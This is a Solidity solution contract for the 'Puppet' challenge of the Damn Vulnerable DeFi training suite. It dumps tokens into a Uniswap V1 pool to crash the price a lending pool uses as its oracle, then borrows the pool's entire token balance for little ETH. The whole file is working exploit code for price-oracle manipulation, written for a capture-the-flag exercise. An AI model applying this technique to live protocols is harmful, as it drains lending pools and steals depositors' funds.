// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract Recover {
    PuppetPool public immutable puppetPool;
    IUniswapV1Exchange public immutable uniswapExchange;
    DamnValuableToken public immutable token;
    address public immutable recoveryAddress;
    address public immutable player;

    constructor(
        address puppetPoolAddress,
        address uniswapExchangeAddress,
        address tokenAddress,
        address recoveryAddress_,
        address player_
    ) payable {
        puppetPool = PuppetPool(puppetPoolAddress);
        uniswapExchange = IUniswapV1Exchange(uniswapExchangeAddress);
        token = DamnValuableToken(tokenAddress);
        recoveryAddress = recoveryAddress_;
        player = player_;
    }

    function recover() external {
        token.transferFrom(msg.sender, address(this), 1000e18);
        token.approve(address(uniswapExchange), 1000e18);
        uniswapExchange.tokenToEthSwapInput(1000e18, 1, block.timestamp * 2);
        
        uint256 ethAmountRequired = puppetPool.calculateDepositRequired(100_000e18);
        puppetPool.borrow{value: ethAmountRequired}(100_000e18, recoveryAddress);
    }

    receive() external payable {}
}